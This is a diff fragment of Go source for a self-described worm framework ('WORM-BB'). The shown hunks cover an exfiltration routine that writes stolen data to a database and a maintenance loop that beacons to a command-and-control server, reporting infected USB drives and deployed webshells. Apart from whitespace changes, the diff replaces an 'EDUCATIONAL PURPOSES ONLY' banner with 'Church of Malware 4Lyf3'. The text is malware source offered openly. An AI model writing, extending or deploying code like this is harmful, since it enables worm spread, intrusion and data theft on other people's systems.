@@ -1852,7 +1921,7 @@ func (de *DataExfiltrator) AddData(data ExfilData) {
 	if de.dbConn != nil {
 		_, err := de.dbConn.Exec(
 			"INSERT INTO exfil_data (worm_id, timestamp, data_type, target, data, encrypted) VALUES (?, ?, ?, ?, ?, ?)",
-			data.WormID, data.Timestamp, data.DataType, data.Target, data.Data, data.Encrypted)
+					 data.WormID, data.Timestamp, data.DataType, data.Target, data.Data, data.Encrypted)
 		if err == nil {
 			de.buffer = de.buffer[:len(de.buffer)-1]
 		}
@@ -1946,12 +2015,12 @@ func (w *Worm) maintenanceLoop() {
 		w.status = "ACTIVE"
 		w.c2Manager.sendToC2("STATUS", map[string]interface{}{
 			"population":   len(w.population.knownInstances),
-			"role":         w.population.leader,
-			"usb_infected": len(w.usbPropagator.infectedUSBs),
-			"webshells":    len(w.webShellManager.deployed),
-			"os":           runtime.GOOS,
-			"arch":         runtime.GOARCH,
-			"version":      VERSION,
+				     "role":         w.population.leader,
+				     "usb_infected": len(w.usbPropagator.infectedUSBs),
+				     "webshells":    len(w.webShellManager.deployed),
+				     "os":           runtime.GOOS,
+				     "arch":         runtime.GOARCH,
+				     "version":      VERSION,
 		})
 	}
 }
@@ -2041,7 +2110,7 @@ func main() {
 	fmt.Println(strings.Repeat("=", 80))
 	fmt.Println("WORM-BB Advanced Propagation Framework")
 	fmt.Printf("Version: %s | OS: %s | Arch: %s\n", VERSION, runtime.GOOS, runtime.GOARCH)
-	fmt.Println("EDUCATIONAL PURPOSES ONLY - Understand to Defend")
+	fmt.Println("Church of Malware 4Lyf3")
 	fmt.Println(strings.Repeat("=", 80))
 
 	worm := NewWorm()
